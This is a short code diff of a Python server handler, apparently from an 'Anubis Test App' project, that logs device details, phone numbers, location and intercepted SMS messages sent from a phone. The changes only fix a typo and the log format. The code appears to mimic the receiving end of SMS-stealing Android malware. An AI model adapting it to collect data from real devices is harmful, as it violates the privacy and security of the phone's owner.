@@ -11,14 +11,12 @@ def device():
     Manufacturer = device_info['manufacturer']
     Model = device_info['model']
     verison = device_info['androidVersion']
-    
-    
     try:
      phoneno = device_info['phoneno']
-     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison +  " and phone number is " + phoneno)
+     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android version is " +  verison +  " and phone number is " + phoneno)
     except:
      location = device_info['location']
-     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android verison is " +  verison)
+     print("Manufacturer is " + Manufacturer + ", Phone Model is " +  Model +  " , Android version is " +  verison)
      print("Location is " + location)
 
 
@@ -33,7 +31,7 @@ def sms():
     # append to the existing txt from the Anubis Test App folder according to your own directory
     # for example
     with open(os.path.join('C:\\Users\\kian_\\Downloads\\Git\\AnubisTestApp_geo\\', 'smsdata.txt'), 'a') as f:
-        f.write('\n' + body)
+        f.write('\n' + 'SMS retrieved from phone number(' + address + '):\n' + body + '\n')
 
     print("SMS Retrieved from Phone Number(" + address + ") : " + body)
     return "SMS Retrieved from Phone Number(" + address + ") : " + body , 200
